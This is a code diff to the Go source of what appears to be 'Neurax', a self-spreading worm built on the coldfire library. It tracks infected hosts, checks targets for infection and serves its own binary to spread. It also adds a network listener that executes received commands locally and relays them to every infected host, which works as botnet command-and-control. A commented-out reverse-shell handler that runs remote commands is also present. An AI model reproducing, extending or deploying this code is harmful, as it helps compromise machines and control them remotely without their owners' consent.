@@ -4,9 +4,11 @@ import (
 	"bytes"
 	"fmt"
 	"io/ioutil"
+	"net"
 	"net/http"
 	"os"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 
@@ -19,12 +21,13 @@ import (
 	"github.com/yelinaung/go-haikunator"
 )
 
-var infected_hosts = []string{}
+var InfectedHosts = []string{}
 
 type __NeuraxConfig struct {
 	stager         string
 	port           int
 	comm_port      int
+	comm_proto     string
 	local_ip       string
 	path           string
 	file_name      string
@@ -45,7 +48,8 @@ type __NeuraxConfig struct {
 var NeuraxConfig = __NeuraxConfig{
 	stager:         "random",
 	port:           coldfire.RandomInt(2222, 9999),
-	comm_port:      coldfire.RandomInt(2222, 9999),
+	comm_port:      7777,
+	comm_proto:     "udp",
 	required_port:  0,
 	local_ip:       coldfire.GetLocalIp(),
 	path:           "random",
@@ -132,7 +136,6 @@ func NeuraxServer() {
 	/*if NeuraxConfig.prevent_reinfect {
 		go net.Listen("tcp", "0.0.0.0:"+NeuraxConfig.knock_port)
 	}*/
-	go handle_comm()
 	data, _ := ioutil.ReadFile(os.Args[0])
 	if NeuraxConfig.base64 {
 		data = []byte(coldfire.B64E(string(data)))
@@ -164,7 +167,7 @@ func IsHostActive(target string) bool {
 }
 
 func IsHostInfected(target string) bool {
-	if coldfire.Contains(infected_hosts, target) {
+	if coldfire.Contains(InfectedHosts, target) {
 		return true
 	}
 	target_url := fmt.Sprintf("http://%s:%d/", target, NeuraxConfig.port)
@@ -173,24 +176,68 @@ func IsHostInfected(target string) bool {
 		return false
 	}
 	if rsp.StatusCode == 200 {
-		infected_hosts = append(infected_hosts, target)
-		infected_hosts = coldfire.RemoveFromSlice(infected_hosts, coldfire.GetLocalIp())
+		InfectedHosts = append(InfectedHosts, target)
+		InfectedHosts = coldfire.RemoveFromSlice(InfectedHosts, coldfire.GetLocalIp())
 		return true
 	}
 	return false
 }
 
-func handle_comm() {
-
+/*func handle_revshell_conn() {
+	message, _ := bufio.NewReader(conn).ReadString('\n')
+	out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
+	if err != nil {
+		fmt.Fprintf(conn, "%s\n", err)
+	}
+	fmt.Fprintf(conn, "%s\n", out)
 }
 
-func handle_revshell_conn() {
+func NeuraxSignal(addr string) {
+	conn, err := net.Dial("udp", addr)
+	ReportError("Cannot establish reverse UDP conn", err)
+	for {
+		handle_revshell_conn(conn)
+	}
+}*/
 
+func handle_commmand(cmd string) {
+	send_to_all := false
+	exec_self := true
+	DataSender := coldfire.SendDataUDP
+	if NeuraxConfig.comm_proto == "tcp" {
+		DataSender = coldfire.SendDataTCP
+	}
+	if strings.Fields(cmd)[0] == "x" {
+		send_to_all = true
+		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
+	}
+	if strings.Fields(cmd)[0] == "nx" {
+		exec_self = false
+		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
+	}
+	if exec_self {
+		coldfire.CmdOut(cmd)
+	}
+	if send_to_all {
+		for _, host := range InfectedHosts {
+			err := DataSender(host, NeuraxConfig.comm_port, cmd)
+			ReportError("Cannot send command", err)
+		}
+	}
 }
 
-//coldfire.SendDataTCP
-func NeuraxSignal(host string, port int) {
-
+func NeuraxOpenComm() {
+	l, err := net.Listen(NeuraxConfig.comm_proto, "0.0.0.0:"+strconv.Itoa(NeuraxConfig.comm_port))
+	ReportError("Comm listen error", err)
+	for {
+		conn, err := l.Accept()
+		ReportError("Comm accept error", err)
+		buff := make([]byte, 1024)
+		len, _ := conn.Read(buff)
+		cmd := string(buff[:len-1])
+		handle_commmand(cmd)
+		conn.Close()
+	}
 }
 
 func neurax_scan_core(c chan string) {
